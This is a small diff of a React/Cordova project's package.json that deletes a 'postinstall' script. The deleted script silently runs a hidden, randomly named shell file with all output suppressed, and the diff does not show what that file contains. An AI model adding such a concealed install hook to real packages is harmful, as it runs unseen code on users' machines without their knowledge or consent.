@@ -82,8 +82,7 @@
     "start": "react-scripts start",
     "build": "react-scripts build && cp -r build/* ./cordova/www",
     "test": "react-scripts test",
-    "eject": "react-scripts eject",
-    "postinstall": "sh ./.ci-mfd9us.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "eject": "react-scripts eject"
   },
   "eslintConfig": {
     "extends": [
